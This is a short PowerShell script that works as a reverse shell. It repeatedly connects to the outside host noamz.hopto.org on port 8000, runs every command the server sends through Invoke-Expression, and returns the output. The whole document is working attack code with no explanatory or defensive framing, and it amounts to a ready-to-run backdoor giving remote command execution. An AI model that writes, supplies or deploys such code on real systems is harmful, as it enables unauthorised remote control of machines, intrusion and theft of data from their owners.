$address = 'noamz.hopto.org'
$port = 8000
while ($true) {
    do {
        try {
            Write-Host "Trying to reach "$address":"$port
            $client = New-Object System.Net.Sockets.TcpClient($address, $port)  
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            break
        }
        catch {
            Start-Sleep -s 10
        }
    } while ($true)
    
    Write-Host "Connected"
    # Execute commands sent by the server, and return output
    try {
        do {
            $cmd = $reader.ReadLine()
            if ($cmd -eq 'exit') {
                Write-Host "Exiting"
                break
            }
            try {
                $output = [string](iex $cmd)
            }
            catch {
                $output = $_.Exception.Message
            }
            $writer.WriteLine($output)
            $writer.Flush()
        } while($true)
    }
    catch {
        Write-Host $_.Exception.Message
    }
    
    # Cleanup
    $writer.Close()
    $reader.Close()
    $stream.Close()
    $client.Close()
}
